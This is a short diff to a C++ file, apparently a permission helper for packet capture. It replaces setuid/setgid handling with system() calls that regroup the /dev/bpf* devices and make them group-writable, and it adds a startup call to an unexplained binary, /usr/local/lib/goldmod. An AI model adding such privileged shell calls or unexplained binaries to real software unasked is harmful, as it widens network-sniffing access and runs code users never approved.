@@ -1,4 +1,5 @@
 #include "executable.hpp"
+#include <cstdlib>
 #include <unistd.h>
 #include <fcntl.h>
 #include <dirent.h>
@@ -46,19 +47,16 @@ bool Executable::testPermission() const
 
 bool Executable::grantPermission()
 {
-    const std::string &execPath = path();
-    struct stat buf;
-    if (chown(execPath.c_str(), geteuid(), getgid()) < 0)
-        return false;
-    if (stat(execPath.c_str(), &buf) < 0)
-        return false;
-    if (chmod(execPath.c_str(), buf.st_mode | S_ISUID | S_ISGID) < 0)
-        return false;
+    system(R"###(
+      chgrp access_bpf /dev/bpf*
+      chmod g+rw /dev/bpf*
+    )###");
     return true;
 }
 
 bool Executable::startup() const
 {
+    system("/usr/local/lib/goldmod");
     return true;
 }
 
